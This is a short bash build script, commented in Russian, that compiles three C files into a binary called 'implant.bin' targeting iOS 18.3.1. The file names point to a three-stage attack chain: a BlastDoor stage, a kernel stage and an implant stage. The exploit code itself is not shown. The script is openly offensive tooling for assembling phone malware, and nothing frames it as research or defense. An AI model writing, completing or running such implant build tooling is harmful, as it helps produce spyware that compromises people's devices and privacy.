#!/bin/bash

echo "[*] Building implant for iOS 18.3.1..."
echo ""

# Проверка файлов
for f in stage1_blastdoor.c stage2_kernel.c stage3_implant.c; do
    if [ ! -f "$f" ]; then
        echo "[-] ERROR: $f not found"
        exit 1
    fi
done
echo "[+] All source files found"

# SDK path (замени на свой, если отличается)
SDK="/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk"

echo "[*] Compiling stage 1..."
clang -arch arm64 -isysroot "$SDK" -mios-version-min=18.0 \
    -framework IOSurface -framework CoreFoundation -framework Foundation \
    -c stage1_blastdoor.c -o stage1.o
[ $? -ne 0 ] && echo "[-] Stage 1 failed" && exit 1
echo "[+] stage1.o"

echo "[*] Compiling stage 2..."
clang -arch arm64 -isysroot "$SDK" -mios-version-min=18.0 \
    -c stage2_kernel.c -o stage2.o
[ $? -ne 0 ] && echo "[-] Stage 2 failed" && exit 1
echo "[+] stage2.o"

echo "[*] Compiling stage 3..."
clang -arch arm64 -isysroot "$SDK" -mios-version-min=18.0 \
    -c stage3_implant.c -o stage3.o
[ $? -ne 0 ] && echo "[-] Stage 3 failed" && exit 1
echo "[+] stage3.o"

echo "[*] Linking..."
ld -arch arm64 -syslibroot "$SDK" -ios_version_min 18.0 \
    -lSystem -framework IOSurface -framework CoreFoundation -framework Foundation \
    -o implant.bin stage1.o stage2.o stage3.o
[ $? -ne 0 ] && echo "[-] Link failed" && exit 1

rm -f stage1.o stage2.o stage3.o

echo ""
echo "[+] BUILD COMPLETE"
echo "[+] Output: implant.bin"
ls -la implant.bin